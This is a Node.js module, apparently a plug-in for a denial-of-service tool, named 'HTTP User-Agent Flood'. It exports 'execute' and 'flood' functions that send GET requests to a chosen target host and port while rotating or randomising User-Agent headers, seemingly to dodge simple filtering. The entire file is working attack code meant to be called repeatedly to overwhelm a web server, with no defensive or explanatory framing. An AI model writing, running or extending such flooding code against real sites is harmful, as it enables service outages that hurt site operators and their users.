const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP User-Agent Flood',
    description: 'Requests with random user agents',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ];
        const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/',
                method: 'GET',
                headers: { 'User-Agent': ua }
            }, (res) => {
                resolve({ status: res.statusCode, userAgent: ua.substring(0, 50) });
                req.destroy();
            });
            
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const randomUA = 'Mozilla/5.0 (Windows NT 10.0; rv:' + Math.floor(Math.random() * 100) + '.0)';
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            headers: { 'User-Agent': randomUA }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.end();
        req.on('error', () => callback(false));
    }
};